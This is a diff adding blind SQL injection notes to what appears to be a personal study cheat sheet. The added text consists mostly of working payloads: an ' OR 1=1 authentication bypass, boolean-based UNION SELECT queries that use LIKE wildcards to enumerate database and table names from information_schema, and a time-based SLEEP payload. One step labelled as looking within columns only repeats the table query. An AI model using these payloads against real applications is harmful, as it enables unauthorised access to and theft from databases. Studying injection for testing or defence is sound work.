@@ -10,3 +10,27 @@ delete = use to delete one or more rows of data within the table
 1. Total In-band
 2. Blind band
 3. Out of band
+
+
+**** BLIND SQLI ****
+---=== AUTHENTICATION BYPASS ===---
+' OR 1=1;--
+
+---=== BOOLEAN BASE ===---
+
+% - wildcard value in sql query
+example: ' UNION SELECT 1,2,3 where database() like '%';--
+
+adding letters, numbers and characters in front of the wildcard value in order to determine the databse name that it starts within
+
+^^^^ once you get database name
+' UNION SELECT [TABLE_COLUMN NUMBERS] FROM information_schema.tables WHERE table_schema = '[databasename]' and table_name like 'a%';--
+
+getting users
+' UNION SELECT [TABLE_COLUMN NUMBERS] FROM information_schema.tables WHERE table_schema = '[databasename]' and table_name like 'users%';--
+
+Looking within columns
+' UNION SELECT [TABLE_COLUMN NUMBERS] FROM information_schema.tables WHERE table_schema = '[databasename]' and table_name like 'a%';--
+
+---=== TIME BASED ===---
+' UNION SELECT SLEEP(5);--
